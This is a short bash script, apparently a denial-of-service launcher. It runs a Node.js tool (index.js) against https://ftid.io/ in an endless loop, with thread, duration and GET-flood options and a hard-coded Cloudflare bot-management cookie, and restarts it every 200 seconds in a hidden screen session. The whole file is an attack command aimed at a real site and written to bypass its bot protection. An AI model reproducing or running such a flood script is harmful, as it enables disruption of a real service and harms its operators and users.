#!/usr/bin/bash

while true
do
    nohup screen -dmS ftidio node index.js https://ftid.io/ --duration 200 --threads 5 --method GET --body null --ratelmit activate --cookie __cf_bm=k2F9IP7H8rX2eIl_CI.q3ZNFcL7f64ov78fnclRuKnY-1643465720-0-AV+rjET40lIEJbu6Wy4YPQLCMnRXZGaWK1d75JX2S/DvuF90nIeR+S4VJaVnNLHXtVA8h84G8WzMAoxSs6188RvKI9vy/X182JFpHxqZuusOKYKeUf5hHD3ufh5WuXCaHg== 2&>/dev/null
    sleep 200
    pkill -f ftidio
done
